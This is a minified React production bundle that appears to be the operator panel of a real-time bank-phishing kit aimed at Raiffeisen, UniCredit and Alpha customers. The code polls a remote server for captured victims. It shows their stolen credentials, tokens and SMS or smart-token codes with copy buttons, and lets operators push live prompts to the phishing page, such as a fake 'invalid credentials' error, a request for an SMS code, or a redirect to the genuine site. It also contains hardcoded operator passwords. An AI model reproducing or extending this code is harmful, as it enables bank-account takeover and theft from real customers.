(this["webpackJsonptokenka-agents"]=this["webpackJsonptokenka-agents"]||[]).push([[0],{23:function(e,t,n){e.exports=n(49)},28:function(e,t,n){},29:function(e,t,n){},49:function(e,t,n){"use strict";n.r(t);var a=n(0),r=n.n(a),c=n(21),s=n.n(c),i=(n(28),n(29),n(3)),o=n(6),u=n(7),l=n(10),E=n(9),d=n(5),m=n(4),_=n.n(m),v=n(11),O=n(22),S=n.n(O),N=n(8),f=n.n(N),T=function(e,t){return Object.keys(t).reduce((function(t,n){return t[n]=e?"".concat(e,".").concat(n):"".concat(n),t}),{})},g=function(e){return T(void 0,e)},p=g({RAIFFEISEN:void 0,UNI_CREDIT:void 0,ALPHA:void 0}),b=g({NEW:void 0,OLD:void 0,IGNORE:void 0,IMPORTANT:void 0}),A=T("USER",{ENTER_HOMEPAGE:void 0,NEW_USER:void 0,TYPING:void 0,LOGGING:void 0,SEND_CREDENTIALS:void 0,SEND_TOKEN:void 0,SEND_SMS:void 0,SEND_TECH_DATA:void 0,RAIF_SEND_AUTH_CODE:void 0,RAIF_SEND_SMART_TOKEN:void 0,RAIF_SEND_SMART_TOKEN_SMS:void 0}),I=T("INSTR",{GO_TO_HOME_SCREEN:void 0,SHOW_LOADING_STATE:void 0,ERR_MSG_INVALID_CREDENTIALS:void 0,GO_TO_ORIGINAL_SITE:void 0,GO_TO_TOKEN_SCREEN:void 0,GO_TO_SMS_SCREEN:void 0,GO_TO_TECH_SCREEN:void 0,RAIF_GO_TO_AUTH_CODE_SCREEN:void 0,RAIF_GO_TO_SMART_TOKEN:void 0,RAIF_GO_TO_SMART_TOKEN_SMS:void 0}),R={get agent(){return JSON.parse(sessionStorage.getItem("agent"))},set agent(e){sessionStorage.setItem("agent",JSON.stringify(e))},get bank(){return JSON.parse(sessionStorage.getItem("bank"))},set bank(e){sessionStorage.setItem("bank",JSON.stringify(e))},get agents(){return[{id:1,username:"agent1",password:"1passw"},{id:2,username:"agent2",password:"2passw"},{id:7,username:"admin",password:"1admin1"}]}},k=function(e){return e.lockedBy===R.agent.id},C=function(e){return e.status===b.IMPORTANT},h=function(e){return e.status===b.IGNORE},D=Object(i.a)(Object(i.a)({},{restURL:"https://paymentsonline.a2hosted.com/token/rest"}),{},{pullingInterval:1300}),y=D.restURL,G=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"GET",n=arguments.length>2?arguments[2]:void 0,a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{updateLastActive:!0},r=(a.updateLastActive,R.lastActive||0);return S()({url:"".concat(y).concat(e),method:t,data:n,headers:{"last-active":r}}).then((function(e){return e.data})).then((function(e){return R.lastActive=e.lastActive,e.data}))},M=D.pullingInterval,j=new Audio("/pew.wav"),F={init:!1,start:function(e,t){var n=this;setInterval(Object(v.a)(_.a.mark((function t(){var a,r;return _.a.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,G("/agent/data");case 2:a=t.sent,(r=a.users).length&&n.init&&r.reduce((function(e,t){var n=t.status,a=t.lockedBy;return e||n===b.NEW&&!a}),!1)&&(console.log("New user"),j.play()),n.init=!0,e(a);case 7:case"end":return t.stop()}}),t)}))),M)},send:function(e,t){return Object(v.a)(_.a.mark((function n(){return _.a.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:G("/message","PUT",{userId:e,action:t}).catch((function(e){return window.alert("Error for",t.type)}));case 1:case"end":return n.stop()}}),n)})))()}},w=function(e,t){return e.reduce((function(e,n){return Object(i.a)(Object(i.a)({},e),{},Object(d.a)({},n.id,function(e,t){var n=t.length&&t[t.length-1].action===A.TYPING,a=t.reduce((function(e,t){switch(t.action){case A.SEND_TOKEN:e.tokens.push(t.payload);break;case A.SEND_CREDENTIALS:e.credentials.push(t.payload)}return e}),{tokens:[],credentials:[]}),r=Object(i.a)(Object(i.a)({},e),{},{isTyping:n,tokens:a.tokens,credentials:a.credentials,messages:t});return setTimeout((function(){r.isTyping=!1}),2e3),r}(n,function(e,t){return t.filter((function(t){return t.userId===e.id}))}(n,t))))}),{})},L=n(1),H=Object(a.createContext)(),P=function(e){var t=Object(a.useState)(void 0),n=Object(L.a)(t,2),c=n[0],s=n[1];return r.a.createElement(H.Provider,{value:[c,s]},e.children)},K=function(e,t){return function(n){n.stopPropagation();var a=t?R.agent.id:void 0;G("/agent/lockUser","POST",{userId:e,agentId:a})}};function x(e){var t=e.user,n=Object(a.useContext)(H),c=Object(L.a)(n,2),s=c[0],i=c[1];return r.a.createElement("div",{className:"user ".concat(t.id===s&&"selected"," "),onClick:function(){i(t.id)}},r.a.createElement("div",{className:"user-info-descr"},r.a.createElement("div",{className:"user-id"},t.id),r.a.createElement("div",{className:"user-status ".concat(C(t)&&"important"," ").concat(h(t)&&"ignored")},t.status),r.a.createElement("div",null,t.description)),r.a.createElement("div",{className:"user-info-tokens"},r.a.createElement("div",null,"Tokens: ",r.a.createElement("b",null,t.tokens.length)),r.a.createElement("div",null,"Credentials: ",r.a.createElement("b",null,t.credentials.length))),r.a.createElement("div",{className:"user-actions"},r.a.createElement(U,{user:t})))}function U(e){var t,n=e.user,c=n.id,s=n.lockedBy,i=s&&R.agents.find((function(e){return e.id===s})),o=k(n);return r.a.createElement("div",{className:"user-lock ".concat((t=n,t.lockedBy&&"locked")," ").concat(o&&"lockedByMe")},s?r.a.createElement(a.Fragment,null,r.a.createElement("span",null,"Locked by ",r.a.createElement("b",null,o?"me":i.username)),o&&r.a.createElement("button",{onClick:K(c,!1)},"unlock")):r.a.createElement("button",{onClick:K(c,!0)},"lock"))}r.a.Component;function W(e){var t=e.usersData,n=$(Object.values(t)),c=Object(a.useState)(""),s=Object(L.a)(c,2),i=s[0],o=s[1],u=q(n,i);return r.a.createElement("div",{className:"users-container "},r.a.createElement(z,{filter:i,setFilter:o}),r.a.createElement("div",{className:"sidebar users "},u.map((function(e){return r.a.createElement(x,{key:e.id,user:e})}))))}function z(e){var t=e.filter,n=e.setFilter;return r.a.createElement("div",{className:"users-filter"},"Filter ",r.a.createElement("input",{type:"text",value:t,onChange:function(e){return n(e.target.value)}}),r.a.createElement("button",{onClick:function(){return n("")}},"clear"))}var B=function(e){return function(t){return e(t)?-1:1}},J=B(k),V=B(C),Y=B(h),$=function(e){return e.sort((function(e,t){var n=Y(e),a=Y(t);if(n!==a)return a-n;var r=J(e),c=J(t);if(r!==c)return r-c;var s=V(e),i=V(t);return s!==i?s-i:t.id-e.id}))},q=function(e,t){return t&&""!==t.trim()?e.filter((function(e){return e.id.toString().includes(t)||e.description&&e.description.includes(t)})):e};function Q(e){var t=e.usersData,n=Object(a.useContext)(H),c=Object(L.a)(n,1)[0],s=t[c];return r.a.createElement("div",{className:"messages sidebar"},s&&r.a.createElement("div",null,r.a.createElement("div",null,r.a.createElement(x,{user:s})),r.a.createElement(X,{messages:s.messages}),r.a.createElement(ae,{userId:c})))}function X(e){var t=e.messages;return r.a.createElement("div",{className:"user-messages"},t&&t.map((function(e){return r.a.createElement(ee,{key:e.id,message:e})})))}var Z=function(e){return e.includes("USER")};function ee(e){var t=e.message,n=t.action,a=t.payload,c=t.time,s=null;switch(n){case A.SEND_CREDENTIALS:case A.SEND_TOKEN:case A.SEND_SMS:case A.SEND_TECH_DATA:case A.RAIF_SEND_AUTH_CODE:case A.RAIF_SEND_SMART_TOKEN:case A.RAIF_SEND_SMART_TOKEN_SMS:s=te;break;case I.GO_TO_HOME_SCREEN:case I.GO_TO_TOKEN_SCREEN:case I.RAIF_GO_TO_AUTH_CODE_SCREEN:case I.GO_TO_SMS_SCREEN:case I.GO_TO_TECH_SCREEN:case I.GO_TO_ORIGINAL_SITE:case I.RAIF_GO_TO_SMART_TOKEN:case I.RAIF_GO_TO_SMART_TOKEN_SMS:case I.ERR_MSG_INVALID_CREDENTIALS:case I.SHOW_LOADING_STATE:s=ne}return s?r.a.createElement("div",{className:"".concat(Z(n)?"user-msg":"agent-msg")},r.a.createElement("div",{className:"msg-item"},r.a.createElement("div",{className:"msg-time"},f()(c).format("HH:mm:ss")),r.a.createElement("div",{className:"msg-action"},r.a.createElement(s,{action:n,payload:a})))):null}function te(e){var t,n=e.action,c=e.payload;switch(n){case A.SEND_CREDENTIALS:t="Credentials";break;case A.SEND_TOKEN:t="Token";break;case A.RAIF_SEND_AUTH_CODE:t="Pers fizice Auth code";break;case A.SEND_SMS:t="Pers fizice SMS code";break;case A.RAIF_SEND_SMART_TOKEN:t="Pers fizice Smart Token";break;case A.RAIF_SEND_SMART_TOKEN_SMS:t="Pers fizice Smart Token SMS";break;case A.SEND_TECH_DATA:t="Technical data"}return r.a.createElement("div",{className:"msg-payload"},r.a.createElement("label",null,t,":"),c&&c.split(";;").map((function(e){return r.a.createElement(a.Fragment,null,r.a.createElement("span",{className:"msg-payload-value"},e),r.a.createElement("button",{onClick:function(){!function(e){var t=document.createElement("textarea");t.value=e,t.setAttribute("readonly",""),t.style={position:"absolute",left:"-9999px"},document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t)}(e)}},"copy"))})))}function ne(e){var t=e.action,n=e.payload;return r.a.createElement("div",null,r.a.createElement("label",null,t),r.a.createElement("span",{className:"msg-payload-value"},n))}function ae(e){var t=e.userId,n=Object(a.useState)(""),c=Object(L.a)(n,2),s=c[0],i=c[1];return r.a.createElement("div",{className:"agent-actions"},r.a.createElement("h1",null,R.bank),r.a.createElement("div",{className:"agent-actions-update-user"},r.a.createElement("div",{className:"agent-action-description"},r.a.createElement("input",{type:"text",value:s,onChange:function(e){return i(e.target.value)}}),r.a.createElement("button",{onClick:function(){return ce(t,s,i)}},"add description")),r.a.createElement("div",{className:"agent-action-status"},r.a.createElement("button",{onClick:function(){return se(t,b.IGNORE)}},"Ignore"),r.a.createElement("button",{onClick:function(){return se(t,b.IMPORTANT)}},"Important"))),r.a.createElement("div",{className:"agent-action-instructions"},r.a.createElement("button",{onClick:function(){return F.send(t,{type:I.GO_TO_HOME_SCREEN})}},"Home"),r.a.createElement("button",{onClick:function(){return F.send(t,{type:I.GO_TO_SMS_SCREEN})}},"Pers fizice SMS Code"),r.a.createElement("button",{onClick:function(){return F.send(t,{type:I.GO_TO_TECH_SCREEN})}},"Technical Works"),r.a.createElement("button",{onClick:function(){return F.send(t,{type:I.GO_TO_ORIGINAL_SITE})}},"Original site"),r.a.createElement("button",{onClick:function(){return F.send(t,{type:I.ERR_MSG_INVALID_CREDENTIALS})}},"Error Credentials"),r.a.createElement("button",{onClick:function(){return F.send(t,{type:I.SHOW_LOADING_STATE})}},"Show Loading ...")),r.a.createElement(re,{userId:t,type:I.GO_TO_TOKEN_SCREEN,text:"Token"}),r.a.createElement("div",null,R.bank===p.RAIFFEISEN&&r.a.createElement("div",null,r.a.createElement("button",{onClick:function(){return F.send(t,{type:I.RAIF_GO_TO_AUTH_CODE_SCREEN})}},"Pers fizice Auth Code"),r.a.createElement("button",{onClick:function(){return F.send(t,{type:I.RAIF_GO_TO_SMART_TOKEN})}},"Pers fizice Smart Token"),r.a.createElement("button",{onClick:function(){return F.send(t,{type:I.RAIF_GO_TO_SMART_TOKEN_SMS})}},"Pers fizice Smart Token SMS"))))}function re(e){var t=e.userId,n=e.type,c=e.text,s=Object(a.useState)(""),i=Object(L.a)(s,2),o=i[0],u=i[1];return r.a.createElement(a.Fragment,null,r.a.createElement("input",{type:"text",value:o,onChange:function(e){return u(e.target.value)}}),r.a.createElement("button",{onClick:function(){F.send(t,{type:n,payload:o}),u("")}},c))}var ce=function(e,t,n){G("/agent/description","POST",{userId:e,description:t}),n("")},se=function(e,t){G("/agent/status","POST",{userId:e,status:t})},ie=function(e){Object(l.a)(n,e);var t=Object(E.a)(n);function n(){var e;return Object(o.a)(this,n),(e=t.call(this)).state={messages:[],users:[]},e}return Object(u.a)(n,[{key:"componentDidMount",value:function(){var e=this;console.log("****init"),F.start((function(t){var n,a,r=t.users,c=t.messages;(r.length||c.length)&&(console.log("data",{users:r,messages:c}),e.setState(Object(i.a)(Object(i.a)({},e.state),{},{users:(n=e.state.users,a=r,a.forEach((function(e){var t=n.findIndex((function(t){return t.id===e.id}));t<0?(n.push(e),setTimeout((function(){e.status===b.NEW&&(e.status=b.OLD)}),1e4)):n[t]=e})),n),messages:e.state.messages.concat(c)})))}))}},{key:"render",value:function(){var e=this.state,t=e.users,n=e.messages,a=w(t,n);return r.a.createElement("div",null,r.a.createElement("div",{className:"welcome"},r.a.createElement(P,null,r.a.createElement(W,{usersData:a}),r.a.createElement(Q,{usersData:a}))))}}]),n}(r.a.Component);function oe(e){var t=R.agent&&Ee(R.agent.username,R.agent.password),n=Object(a.useState)(t),c=Object(L.a)(n,2),s=c[0],i=c[1];return s?r.a.createElement(a.Fragment,null,e.children):r.a.createElement(ue,{setLogged:i})}function ue(e){var t=e.setLogged,n=Object(a.useState)(""),c=Object(L.a)(n,2),s=c[0],i=c[1],o=Object(a.useState)(""),u=Object(L.a)(o,2),l=u[0],E=u[1],d=Object(a.useState)(p.ALPHA),m=Object(L.a)(d,2),_=m[0],v=m[1],O=Object(a.useState)(!1),S=Object(L.a)(O,2),N=S[0],f=S[1];return r.a.createElement("div",{className:"login"},r.a.createElement("div",null,r.a.createElement("select",{id:"banks",name:"banks",onChange:function(e){return v(e.target.value)},defaultValue:p.ALPHA},r.a.createElement("option",{value:p.ALFA},p.ALPHA),r.a.createElement("option",{value:p.RAIFFEISEN},p.RAIFFEISEN),r.a.createElement("option",{value:p.UNI_CREDIT},p.UNI_CREDIT))),r.a.createElement("div",null,r.a.createElement("input",{type:"text",value:s,onChange:function(e){return i(e.target.value)},placeholder:"username"})),r.a.createElement("div",null,r.a.createElement("input",{type:"password",value:l,onChange:function(e){return E(e.target.value)},placeholder:"password"})),r.a.createElement("div",null,r.a.createElement("button",{onClick:function(e){return le(s,l,f,t,_)}},"login")),N&&r.a.createElement("div",{className:"error"},"Invalid Credentials"))}var le=function(e,t,n,a,r){var c=Ee(e,t);R.bank=r,c?(R.agent=c,n(!1),a(!0)):n(!0)},Ee=function(e,t){return R.agents.find((function(n){return n.username===e&&n.password===t}))};console.log("ENV:","production");var de=function(){return r.a.createElement("div",{className:"App"},r.a.createElement(oe,null,r.a.createElement(ie,null)))};Boolean("localhost"===window.location.hostname||"[::1]"===window.location.hostname||window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));s.a.render(r.a.createElement(r.a.StrictMode,null,r.a.createElement(de,null)),document.getElementById("root")),"serviceWorker"in navigator&&navigator.serviceWorker.ready.then((function(e){e.unregister()})).catch((function(e){console.error(e.message)}))}},[[23,1,2]]]);
//# sourceMappingURL=main.bf0333a1.chunk.js.map